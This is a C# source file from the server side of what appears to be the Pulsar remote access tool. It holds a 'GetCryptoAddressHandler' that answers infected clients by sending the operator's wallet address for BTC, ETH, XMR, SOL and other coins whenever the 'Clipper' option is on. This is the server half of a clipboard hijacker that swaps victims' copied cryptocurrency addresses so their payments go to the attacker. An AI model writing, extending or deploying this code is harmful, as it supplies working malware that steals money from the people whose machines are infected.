﻿using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Clipboard;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.UserSupport.MessageBox;
using Pulsar.Common.Networking;
using Pulsar.Server.Forms;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.Json;
using System.Windows.Forms;

namespace Pulsar.Server.Messages
{
    // I literally copied all of this from another handler and shoved it in here

    /// <summary>
    /// Handles messages for the interaction with the remote client status.
    /// </summary>
    public class GetCryptoAddressHandler : MessageProcessorBase<object>
    {
        public delegate void AddressReceivedEventHandler(object sender, Client client, string addressType);

        public event AddressReceivedEventHandler AddressReceived;

        public GetCryptoAddressHandler() : base(true)
        {
        }

        public override bool CanExecute(IMessage message) => message is DoGetAddress;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            if (message is DoGetAddress addressMessage)
            {
                Execute((Client)sender, addressMessage);
            }
        }

        private void Execute(Client client, DoGetAddress message)
        {
            AddressReceived?.Invoke(this, client, message.Type);

            FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
            if (frm != null && frm.ClipperCheckbox.Checked)
            {
                var addressGetters = new Dictionary<string, Func<string>>
                {
                    { "BTC", frm.GetBTCAddress },
                    { "LTC", frm.GetLTCAddress },
                    { "ETH", frm.GetETHAddress },
                    { "XMR", frm.GetXMRAddress },
                    { "SOL", frm.GetSOLAddress },
                    { "DASH", frm.GetDASHAddress },
                    { "XRP", frm.GetXRPAddress },
                    { "TRX", frm.GetTRXAddress },
                    { "BCH", frm.GetBCHAddress }
                };

                if (!string.IsNullOrEmpty(message.Type) && addressGetters.TryGetValue(message.Type, out var getAddress))
                {
                    string address = getAddress();
                    client.Send(new DoSendAddress
                    {
                        Address = address
                    });
                }

                FrmMain.AddNotiEvent(frm, client.Value.UserAtPc, "Requested crypto address", message.Type);
            }
        }
    }
}
